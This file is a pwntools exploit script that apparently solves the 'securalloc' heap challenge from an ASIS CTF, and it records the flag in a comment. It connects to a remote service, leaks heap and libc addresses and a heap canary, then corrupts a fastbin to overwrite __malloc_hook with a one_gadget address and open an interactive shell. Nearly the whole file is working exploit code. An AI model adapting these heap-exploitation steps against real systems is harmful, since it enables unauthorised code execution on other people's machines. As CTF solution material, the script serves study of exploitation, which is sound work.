#!/usr/bin/env python
# -*- coding: utf-8 -*-

# ASIS{l3ft0v3r_ru1n3d_3v3ryth1ng} 
from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./securalloc.elf"
elf = context.binary
libc = elf.libc
libc.sym['one_gadget'] = 0x4526a

#  io = process("./securalloc.elf")
io = remote("76.74.177.238", 9001)

def DEBUG():
    info("s_malloc @ {:#x}".format(0xBFF))
    info("s_free @ {:#x}".format(0xC7D))
    info("edit @ {:#x}".format(0xC39))
    info("show @ {:#x}".format(0xC67))
    pause()

def add(size):
    io.sendlineafter("> ", "1")
    io.sendlineafter("Size: ", str(size))

def edit(data):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Data: ", data)

def show():
    io.sendlineafter("> ", "3")

def delete():
    io.sendlineafter("> ", "4")

add(0x60)
add(0x10)
show()
io.recvuntil("Data: ")
heap = u64(io.recvuntil('\n', drop = True).ljust(8, '\0')) - 0xf0
assert heap & 0xfff == 0
success("heap @ {:#x}".format(heap))

add(0x0)
add(0x10)
show()

libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['_IO_file_jumps']
assert libc.address & 0xfff == 0
success("libc @ {:#x}".format(libc.address))

add(0x140)
add(0x10)
show()
io.recvuntil("Data: ")
canary = u64(io.recvn(8)) &~ 0xff
success("heap canary @ {:#x}".format(canary))

# house of force
#  add(0x10)
#  edit(flat('x' * 0x10, canary, 0, -1))

#  top_chunk = heap + 0x2c0
#  success("top_chunk @ {:#x}".format(top_chunk))

#  DEBUG()
#  context.log_level = "debug"
#  add(libc.sym['__malloc_hook'] - 0x10 - top_chunk - 0x10 -0x10)
add(0x10)
delete()

add(0x50)
delete()

add(0x10)
edit(flat('x' * 0x10, canary, '\0' * 8, 0x71, libc.sym['__malloc_hook'] - 0x23))

add(0x50)
add(0x50)
DEBUG()
#  edit(cyclic(n = 8, length = 0x40))
edit(flat('\0' * 3, libc.sym['one_gadget'], libc.sym['__libc_realloc'] + 16))

add(0x10)

io.interactive()
